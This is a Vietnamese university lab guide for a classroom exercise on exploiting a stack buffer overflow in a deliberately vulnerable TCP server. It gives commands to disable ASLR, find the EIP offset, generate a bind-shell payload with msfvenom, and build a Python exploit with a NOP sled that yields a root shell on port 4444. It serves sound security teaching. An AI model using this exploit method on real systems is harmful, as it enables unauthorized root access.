
# TÌM HIỂU BÀI THỰC HÀNH KHAI THÁC LỖI TRÀN BỘ ĐỆM SỬ DỤNG LISTEN SHELLCODE
## Mục đích:
- Sinh viên hiểu được nguyên nhân gây ra lỗi tràn bộ đệm và cách khai thác
- Sinh viên vận dụng các kiến thức vào thực hiện khai thác lỗi tràn bộ đệm bằng Listen shell - khai thác lỗi tràn bộ đệm để mở 1 cổng khác trên máy server, từ đó có thể truy cập từ xa vào máy server trên client thứ 2.
## Yêu cầu với sinh viên:
- Có kiến thức cơ bản về ngôn ngữ lập trình C
- Tìm hiểu về Stack, Function, Buffer Overflow và các cơ chế bảo vệ của hệ thống.
- Tìm hiểu về trình gỡ rối gdb
- Tìm hiểu các thanh ghi $esp, $ebp và $eip
- Sử dụng Python để tạo các mẫu văn bản đơn giản
- Chỉnh sửa tệp nhị phân bằng hexedit
- Sử dụng NOP sleb
- Tạo tải trọng với msfvenom
## Folder ptit-bufferoverflow2 chứa code của bài thực hành.
## Cách thực hiện bài thực hành:
### 1. Tải file imodule.tar về máy của bạn. 
Giải nén và chuyển folder “bufferoverflow_listenshellcode” vào folder labs của bạn.
Khởi động bài lab: Vào terminal, gõ:

    labtainer buferoverflow-listenshellcode

Sau khi khởi động xong ba terminal ảo sẽ xuất hiện, một cái là máy server và hai máy client. Biết rằng 3 máy nằm cùng mạng LAN.
    
### 2. Các chương trình được mô tả dưới đây sẽ nằm trong thư mục chính.

#### Ngẫu nhiên hóa không gian địa chỉ. 
Một số hệ thống dựa trên Linux sử dụng ngẫu nhiên hóa không gian địa chỉ (ASLR) để ngẫu nhiên hóa địa chỉ bắt đầu của heap và stack. Điều này làm cho việc đoán các địa chỉ chính xác trở nên khó khăn; đoán địa chỉ là một trong những bước quan trọng của các cuộc tấn công tràn bộ đệm. Trong bài lab này, ta tắt các tính năng này bằng các lệnh sau:

    echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

Trên terminal server sử dụng lệnh “ifconfig”, xác định địa chỉ IP và địa chỉ mạng LAN.

Dùng lệnh ls để xem các file/chương trình có trên máy server có file buffer.c là chương trình C chứa lỗi bufferoverflow và file thực thi buffer. Đọc hiểu chương trình buffer.c

Thực hiện lắng nghe kết nối giữa máy chủ và máy khách:
Trước hết đặt quyền thực thi cho chương bằng lệnh sử dụng lệnh:

    chmod a+x buffer

Thực thi chương trình bằng lệnh: 

    ./buffer

Lúc này máy chủ đang lắng nghe trên cổng TCP 4001. Trên máy client bất kỳ thực hiện kết nối đến server qua cổng này bằng lệnh:

    nc <IP_server> <port>

Thấy thông báo “Welcome to my server!” tức là đã kết nối thành công đến server. Nhập thông điệp và nhấn Enter. Máy chủ phản hồi lại thông tin đầu vào và yêu cầu một tin nhắn khác.

#### Thực hiện trình gỡ rối gdb buffer.

- Sử dụng lệnh *list* để xem mã nguồn cho máy chủ. Mã nguồn hiển thị phần bắt đầu của hàm main(), hàm này gọi hàm socket() ở dòng 29 để mở quá trình nghe. Đọc mã nguồn và cho biết hàm main() sử dung bộ đệm là bao nhiêu?

- Sử dụng lệnh *list 11, 20* khi đó ta sẽ thấy hàm copier() chỉ sử dụng bộ đệm dài 1024 ký tự. Điều này gợi ý rằng hàm main() sẽ cho phép nhập hơn 1024
ký tự và điều đó sẽ làm tràn bộ đệm trong hàm copier().

#### Gây lỗi tràn bộ đệm cho chương trình C

Trên máy client tạo một file b1 cho phép nhập vào một chuỗi ký tự A dài 1100 ký tự. Ví dụ: *print 'A' * 1100*

Thực hiện các lệnh sau để tạo tệp khai thác”:

Đặt quyền thực thi cho tệp b1:

    chmod a+x b1

Thực thi tệp b1 và chuyển hướng đầu ra của b1 sang một tệp tin khác:

    ./b1 > e1

Để xem thông tin về tệp tin e1 sử dụng lệnh: *ls -l e1*. Kết quả trả về cho thấy tệp dài 1101 byte gồm 1100 ký tự 'A' và 1 dòng feed.

Thực hiện tấn công vào máy chủ qua cổng 4001 bằng cách chuyển hướng
đầu vào là tệp e1. Khi đó thì trên máy chủ gặp sự cố phân đoạn với lỗi “Segmentation fault!”.

Biết rằng bộ đệm dài 1024 byte đã bị đầu vào 1100 byte làm hỏng máy chủ. Ở đâu đó trong khoảng từ 1024 đến 1100 byte là các byte sẽ có kết thúc bằng $eip.

Để tìm được nó hãy đặt một mẫu byte không lặp lại trong 100 byte cuối cùng của hoạt động khai thác.
- Tạo tệp b2 có 1000 ký tự đầu tiên là ký tự A, 100 ký tự còn lại là các số có hai chữ số từ 0 đến 49.
- Sau đó hãy tạo tệp khai thác e2. Sử dụng lệnh cat e2 để đọc tệp.
- Trên máy server sử dụng trình gỡ rối gdb và run. Thực hiện tấn công vào máy chủ qua cổng 4001 bằng cách chuyển hướng đầu vào là tệp e2. Khi đó máy chủ gặp sự cố với lỗi “Segmentation fault”, và nó đang chỉ đến địa chỉ 0x39313831.
- Lệnh info register hiện thị thông tin của các thanh ghi. Thấy được rằng địa chỉ bên trên rơi vào thanh ghi eip. Điều này hiện thị $eip tại thời điểm xảy ra sự cố chứa 0x39313831.

Các số có mã ANSI rất đơn giản như sau:
| Hex| Char | 
| :----: |:----:| 
|30 |0| 
|31|1|
|32|2|
|33| 3|
|34| 4|
|35 |5|
|36 |6|
|37 |7|
|38 |8|
|39 |9|

Vì vậy, $eip là 0x39313831 do các byte trong RAM là các ký tự 1819. Thứ tự bị đảo ngược vì văn bản ANSI được hiểu là giá trị endian nhỏ.

#### Cố gắng đặt một địa chỉ cụ thể 0x44434241 và thành ghi eip

Tạo tệp b3 dài 1101 byte gồm có:
- 1000 ký tự 'A'
- Các số đếm từ 00 đến 17 tổng cộng 36 ký tự
- $eip là \x41\x42\x43\x44 tương đương với ABCD trong ANSI
- Còn lại là ký tự 'X' để tạo tổng chiều dài 1100 (+1 cho dòng feed).
Sau đó hãy tạo tệp khai thác e3. Sử dụng lệnh cat e3 để đọc tệp.

Thực hiện tấn công vào máy chủ qua cổng 4001 bằng cách chuyển hướng
đầu vào là tệp e3. Khi đó máy chủ gặp sự cố với lỗi “Segmentation fault”, và nó đã trỏ đến địa chỉ 0x44434241.

Xem thông tin của các thanh ghi và đúng là tại vị trí của thanh ghi $eip chứa địa chỉ trên. Điều này có nghĩa $eip đã được kiểm soát.

#### Trước khi thực hiện chèn shellcode thì hay thử tạo ra shellcode của mình:
Bạn có thể sử dụng file shellcode chúng tôi đã tạo sẵn trên máy client. Hoặc tự tạo shellcode bằng cách sau:
- Shellcode là trọng tải của việc khai thác. Nó có thể làm bất cứ điều gì bạn muốn, nhưng nó không được chứa bất kỳ byte rỗng (00) nào vì chúng sẽ chấm dứt chuỗi sớm và ngăn bộ đệm tràn. Metasploit cung cấp một công cụ có tên msfvvenom để tạo shellcode.
Để hiển thị khai thác có sẵn cho nền tảng Linux, liên kết shell với cổng TCP đang nghe dùng lệnh:

    msfvenom -l payloads | grep linux | grep bind_tcp


Cách khai thác mà chúng tôi muốn nêu ở đây là: 
    
    linux/x86shell_bind_tcp
Để tạo mã khai thác python, thực hiện lệnh:

    msfvenom -p linux/x86/shell_bind_tcp -f python

Tải trọng trả về kết quả có chứa một byte rỗng (‘\x00), byte đó sẽ chấm dứt chuỗi, ngăn không cho shellcode đi vào bộ đệm.

Chúng ta có thể sử dụng khóa chuyển *-b* hoặc *-e x86/alpha_mixed*.
Thực hiện lệnh này để tạo ra shellcode có payload dài 232 bytes:

    msfvenom -p linux/x86/shell_bind_tcp AppendExit=true -e x86/alpha_mixed -f python

#### Sau khi tạo được shellcode thì tiến hành chèn shellcode để tiếp tục khai thác lỗi tràn bộ đệm:
Tạo tệp b4 có nội dung như sau:

    #! /usr/bin/python
    <INSERT SHELLCODE HERE>
    prefix = 'A' * (1036 - 200 - len(buf))
    nopsled = '\x90' * 200
    eip = '\x41\x42\x43\x44'
    padding = 'X' * (1100 - 1036 - 4)
    print prefix + nopsled + buf + eip + padding

- Tạo tệp khai thác e4 và tiến hành gỡ lỗi máy chủ. Máy chủ vẫn báo lỗi phân đoạn tại $eip.
- Xem lại cấu trúc ngăn xếp và chỉ ra lỗi tràn bộ đệm xảy ra ở dòng nào? Hãy đặt một điểm dừng break ngay sau dòng xảy ra lỗi tràn bộ đệm và xem sự thay đổi của thanh ghi eip.
- Tại thời điểm này thì các giá trị $ebp và $esp đã đúng địa chỉ. Lúc này ta có thể kiểm tra ngăn xếp: *x/260x $esp*
- Hãy chỉ ra đâu là các NOP sleb.
Khi đã nhận được các địa chỉ của các NOP sleb mà shellcode tạo thành, điều chỉnh địa chỉ $eip để trúng NOP sleb. Tiến hành gỡ lỗi máy chủ và lúc này máy chủ không gặp sự cố gì, server đang lắng nghe. Điều này chứng tỏ việc khai thác đã hoạt động. Nó mở một shell mới và đang lắng nghe trên cổng 4444.

#### Trên máy client thứ 2 thử kết nối đến server qua cổng 4444:
Bây giờ bạn có thể thực thi các lệnh Linux từ shell.

    whoami
    pwd
    uname -a

Lúc này client2 đã có quyền root của máy server. Hãy đọc file hash.txt có trong thư mục /root.
#### Kết thúc bài lab:
Trên terminal đầu tiên sử dụng câu lênh sau để kết thúc bài lab:

    stoplab buferoverflow-listenshellcode


## Appendix

Any additional information goes here

